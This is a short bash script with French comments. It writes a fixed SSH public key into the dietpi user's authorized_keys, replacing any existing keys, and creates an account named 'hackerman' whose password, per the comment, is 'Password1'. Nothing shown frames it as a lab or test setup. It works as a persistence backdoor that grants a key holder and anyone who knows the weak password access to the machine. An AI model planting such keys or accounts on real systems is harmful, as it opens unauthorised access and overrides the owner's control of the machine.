#!/bin/bash

# Authoriser clef publique pour dietpi
mkdir /home/dietpi/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMRkPkgi3lt9cT6cYlP8j9BWXhgVpW0CdV4p2T2v6cw" > /home/dietpi/.ssh/authorized_keys

# Créer utilisateur hackerman avec mot de passe: Password1
useradd -m -p saMNhdbYqwtng hackerman
